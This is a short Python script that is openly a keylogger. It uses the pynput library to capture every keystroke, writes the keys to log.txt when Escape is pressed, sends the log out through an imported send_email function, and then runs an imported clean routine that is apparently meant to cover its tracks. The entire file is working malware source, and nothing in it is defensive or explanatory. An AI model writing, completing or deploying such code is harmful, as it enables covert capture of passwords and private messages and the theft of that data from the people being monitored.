from pynput.keyboard import Key, Listener  # Correctly import Key
from send_email import send_email  # Send the data through Email
from KLcleaner import clean  # Clean the data

keys = []

def update_log():
    """Update the log file with the recorded keys."""
    with open('log.txt', mode='w', encoding='utf-8') as file:
        # Convert keys to a more readable format
        file.writelines(' '.join(str(key) for key in keys) + '\n')  # Join keys with a space

def on_press(key):
    """Handle key press events."""
    keys.append(key)  # Append the key to the keys list

def on_release(key):
    """Handle key release events."""
    if key == Key.esc:  # Check for the Escape key
        update_log()  # Update the log file
        send_email()  # Send the logged data via email
        return False  # Stop the listener

if __name__ == "__main__":
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()  # Start the listener

    clean()  # Call the clean function
